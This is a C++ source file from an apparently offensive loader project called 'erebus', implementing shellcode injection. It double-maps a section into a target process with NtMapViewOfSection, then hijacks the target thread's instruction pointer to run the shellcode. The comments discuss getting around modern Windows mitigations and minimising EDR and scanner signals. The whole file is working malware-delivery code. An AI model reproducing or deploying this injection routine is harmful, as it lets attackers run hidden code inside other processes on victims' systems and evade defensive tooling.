#include "../../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 1
	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		LOG_INFO("Injection via. NtMapViewOfSection");

		HANDLE section_handle;
		// LARGE_INTEGER's anonymous-struct initializer takes (LowPart, HighPart);
		// passing a single SIZE_T like { shellcode_size } sets LowPart only and
		// works for sub-4 GiB shellcode but is fragile. Use QuadPart explicitly.
		LARGE_INTEGER section_size;
		section_size.QuadPart = (LONGLONG)shellcode_size;

		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
		ImportFunction(ntdll, NtCreateSection, typeNtCreateSection);
		ImportFunction(ntdll, NtMapViewOfSection, typeNtMapViewOfSection);
		ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
		ImportFunction(ntdll, NtClose, typeNtClose);

		// Pagefile-backed nameless section. Section max is RWX because we
		// map two views: a LOCAL one at PAGE_READWRITE that receives the
		// shellcode bytes via memcpy, and a REMOTE one at PAGE_EXECUTE_READ
		// that the hijacked thread runs. NtMapViewOfSection cannot raise a
		// view above section max, so the max must cover both.
		NTSTATUS status = NtCreateSection(
			&section_handle,
			SECTION_ALL_ACCESS,
			NULL,
			&section_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to create section (NTSTATUS: 0x%08X)", status);
			return;
		}

		LOG_SUCCESS("Section created");

		// Double-map pattern — canonical NtMapViewOfSection injection.
		//
		// History of failed simplifications that led here:
		//   1. Single-map RX + NtWriteVirtualMemory: failed with
		//      STATUS_PARTIAL_COPY (0x8000000D). Old Windows used to
		//      transparently bypass page protection on section-backed
		//      writes when the section max allowed them, but post-Win10
		//      1903 with kernel mitigations this is refused.
		//   2. Single-map RW + NtProtectVirtualMemory flip to RX: failed
		//      with STATUS_SECTION_PROTECTION (0xC000004E). Modern Windows
		//      (ACG / no-new-executable-pages) refuses to grant EXECUTE
		//      to a section-backed view that was mapped without it, even
		//      when the section max permits RWX — the mitigation looks at
		//      the view's initial protection, not the section's max.
		//
		// The working pattern: map the section TWICE. Local view is RW
		// (current process) so we can memcpy the shellcode in with no
		// cross-process subprocess call at all. Remote view is RX
		// (target process) from its very first mapping, so no protection
		// transition is required. Both views back onto the same section
		// data, so the bytes written through the local RW view appear
		// executable in the remote RX view. Unmap the local view
		// immediately after the copy to minimise the dwell time of the
		// RW mapping in our own address space.
		//
		// Telemetry note: EDR sees two NtMapViewOfSection calls on the
		// same section handle with different protections. This is a
		// well-known pattern and is shared with many legitimate uses of
		// shared-memory sections, so the signal is mild.
		PVOID local_address = NULL;
		SIZE_T local_view_size = shellcode_size;
		status = NtMapViewOfSection(
			section_handle,
			(HANDLE)(LONG_PTR)-1,  // current process pseudo-handle
			&local_address,
			NULL,
			NULL,
			NULL,
			&local_view_size,
			(SECTION_INHERIT)ViewShare,
			NULL,
			PAGE_READWRITE
		);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to map local view (NTSTATUS: 0x%08X)", status);
			NtClose(section_handle);
			return;
		}

		// Copy shellcode into the shared section backing via the local
		// RW view. memcpy (via RtlCopyMemory) is fine here because we own
		// the local address space; no cross-process subprocess invocation.
		RtlCopyMemory(local_address, shellcode, shellcode_size);

		// Map the remote view as PAGE_EXECUTE_READ from its first
		// mapping. No protection transition needed, no RW window in the
		// remote process at any point.
		PVOID remote_address = NULL;
		SIZE_T remote_view_size = shellcode_size;
		status = NtMapViewOfSection(
			section_handle,
			process_handle,
			&remote_address,
			NULL,
			NULL,
			NULL,
			&remote_view_size,
			(SECTION_INHERIT)ViewShare,
			NULL,
			PAGE_EXECUTE_READ
		);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to map remote view (NTSTATUS: 0x%08X)", status);
			NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, local_address);
			NtClose(section_handle);
			return;
		}

		// Drop the local RW mapping immediately — the shellcode bytes
		// live in the section, not in our process address space. Any
		// future static-scanner sweep of our own VAD sees no writable
		// shared mapping.
		NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, local_address);

		LOG_SUCCESS("Mapped to remote process at: 0x%08pX", remote_address);

		// Get thread context and hijack RIP
		LPCONTEXT context_ptr = new CONTEXT();
		context_ptr->ContextFlags = CONTEXT_FULL;
		
		if (!GetThreadContext(thread_handle, context_ptr)) {
			LOG_ERROR("Failed to get thread context (Code: 0x%08lX)", GetLastError());
			delete context_ptr;
			NtUnmapViewOfSection(process_handle, remote_address);
			NtClose(section_handle);
			return;
		}

		// Hijack instruction pointer to shellcode
#ifdef _WIN64
		context_ptr->Rip = (DWORD64)remote_address;
#else
		context_ptr->Eip = (DWORD)remote_address;
#endif

		if (!SetThreadContext(thread_handle, context_ptr)) {
			LOG_ERROR("Failed to set thread context (Code: 0x%08lX)", GetLastError());
			delete context_ptr;
			NtUnmapViewOfSection(process_handle, remote_address);
			NtClose(section_handle);
			return;
		}

		LOG_SUCCESS("Thread context hijacked to: 0x%08pX", remote_address);

		delete context_ptr;

		// Resume thread to execute shellcode
		status = NtResumeThread(thread_handle, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
		}
		else {
			LOG_SUCCESS("Thread resumed, shellcode executing");
		}

		// Cleanup: no local mapping to tear down, just close the section.
		// The remote view stays mapped in the target until its process exits
		// or the shellcode unmaps itself.
		NtClose(section_handle);
		NtClose(process_handle);
		NtClose(thread_handle);

		LOG_SUCCESS("Injection Complete!");

		return;
	}
#endif
} // namespace erebus
